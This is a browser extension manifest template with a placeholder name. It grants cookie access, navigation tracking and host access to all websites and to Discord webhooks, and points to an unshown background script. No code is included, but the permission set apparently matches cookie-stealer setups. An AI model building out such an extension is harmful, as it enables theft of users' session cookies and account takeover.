{
  "manifest_version": 3,
  "name": "<<YOUR_EXTENSION_NAME>>",
  "version": "1.1",
  "permissions": ["cookies", "webNavigation"],
  "host_permissions": [
    "<all_urls>",
    "https://discord.com/api/webhooks/*"
  ],
  "icons": {
    "16": "logo.png",
    "48": "logo.png",
    "128": "logo.png"
  },
  "action": {
    "default_icon": "logo.png"
  },
  "background": {
    "service_worker": "background.js"
  }
}
